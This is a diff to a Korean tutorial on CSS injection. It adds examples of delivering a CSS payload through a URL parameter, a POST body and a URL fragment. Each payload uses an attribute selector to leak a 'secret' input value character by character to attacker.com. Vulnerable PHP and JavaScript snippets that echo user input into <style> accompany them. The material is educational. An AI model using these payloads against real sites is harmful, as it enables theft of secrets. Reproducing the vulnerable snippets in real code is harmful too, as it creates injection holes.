@@ -116,9 +116,65 @@ input[name="secret"][value^="d"] {
 
 서버는 background 이미지를 불러오려고 `https://attacker.com/leak?q=d`에 요청을 보냅니다.
 
-그럼 공격자는 로그를 보고:
 
-> "오, d로 시작하는구나!"
+#### ✔ 가능 경로 1) URL 파라미터
+
+예:
+
+```
+https://victim.com/?theme=input[name="secret"][value^="d"]{background:url('https://attacker.com/leak?q=d')}
+```
+
+그리고 서버가 이렇게 출력하면 공격 성공:
+
+```html
+<style>
+    {{ $_GET['theme'] }}
+</style>
+```
+
+
+#### ✔ 가능 경로 2) POST 요청 body
+
+예:
+
+```
+POST /profile
+Content-Type: application/x-www-form-urlencoded
+
+css=input[name="secret"][value^="d"]{background:url('https://attacker.com/leak?q=d')}
+```
+
+그리고 서버가 이렇게 사용하면:
+
+```html
+<style>
+    <?= $_POST['css'] ?>
+</style>
+```
+
+바로 CSS Injection이 발생.
+
+
+#### ✔ 가능 경로 3) Fragment (# 뒤)
+
+```
+https://victim.com/#input[name....]
+```
+
+하지만 ❌ *서버에는 fragment가 전달되지 않음*
+
+➡️ 클라이언트 JS가 `location.hash`를 읽어서
+그걸 `<style>` 안에 넣는 코드가 있을 때만 공격 가능.
+
+예:
+
+```javascript
+let css = location.hash.substring(1);
+document.head.innerHTML += `<style>${css}</style>`;
+```
+
+이런 코드가 있다면 fragment 조작만으로도 CSSI 가능.
 
 ---
 
